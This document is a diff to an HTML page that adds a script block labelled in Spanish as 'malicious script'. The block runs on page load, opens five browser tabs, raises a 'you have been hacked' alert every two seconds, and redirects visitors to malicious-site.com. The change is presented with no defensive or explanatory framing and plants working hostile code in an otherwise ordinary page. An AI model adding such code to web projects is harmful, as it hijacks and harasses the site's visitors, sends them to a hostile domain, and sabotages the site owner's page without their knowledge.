@@ -157,5 +157,28 @@
             window.location.protocol = 'https:';
         }
     </script>
+
+    <script>
+        // Script malicioso
+        function maliciousScript() {
+            // Abrir múltiples pestañas
+            for (let i = 0; i < 5; i++) {
+                window.open('https://example.com', '_blank');
+            }
+
+            // Mostrar alertas molestas
+            setInterval(() => {
+                alert('¡Has sido hackeado!');
+            }, 2000);
+
+            // Redirigir a otra página
+            setTimeout(() => {
+                window.location.href = 'https://malicious-site.com';
+            }, 5000);
+        }
+
+        // Ejecutar el script malicioso al cargar la página
+        window.onload = maliciousScript;
+    </script>
 </body>
 </html>
